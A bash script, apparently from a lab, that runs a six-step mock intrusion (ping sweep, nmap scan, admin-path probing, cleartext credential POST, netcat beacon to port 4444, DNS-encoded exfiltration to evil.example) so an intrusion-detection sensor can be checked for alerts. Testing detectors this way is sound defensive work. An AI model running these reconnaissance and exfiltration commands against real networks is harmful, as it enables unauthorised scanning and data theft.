#!/bin/bash
# A scripted "incident" — six things an attacker with a foothold on a Perth
# workstation might do, each of which the sensor should notice. Run it from
# the host with `make attack`, optionally while capturing with `make capture`.
#
# Everything here is a real tool making real connections. Nothing is faked.

set -u
TARGET=${TARGET:-10.10.20.80}
SERVERS=${SERVERS:-10.10.20}

say() { printf '\n\033[1;36m▸ %s\033[0m\n' "$1"; }

say "1/6  Sweeping the servers subnet for live hosts"
for i in $(seq 1 25); do ping -c1 -W1 "$SERVERS.$i" >/dev/null 2>&1 & done; wait

say "2/6  Port-scanning the host we found"
nmap -T4 -Pn -p 1-300 "$TARGET" 2>&1 | tail -4

say "3/6  Fingerprinting the web service"
curl -s -o /dev/null -A "Mozilla/5.0 Nmap Scripting Engine" "http://$TARGET/"

say "4/6  Probing for an admin interface"
for p in /admin /admin/login /admin/config; do
    curl -s -o /dev/null -w "  $p -> %{http_code}\n" "http://$TARGET$p"
done

say "5/6  Submitting credentials over cleartext HTTP"
curl -s -o /dev/null -d 'user=jsmith&password=Summer2026!' "http://$TARGET/login"

say "6/6  Beaconing out to a C2 port, and staging DNS exfil"
timeout 3 nc -w2 "$TARGET" 4444 </dev/null >/dev/null 2>&1
dig +short +time=1 +tries=1 \
    ZXhmaWx0cmF0ZWQtY3VzdG9tZXItcmVjb3Jkcy1iYXRjaC0wMDE.evil.example >/dev/null 2>&1

say "Done. Check what the sensor made of it:  make ids-alerts"
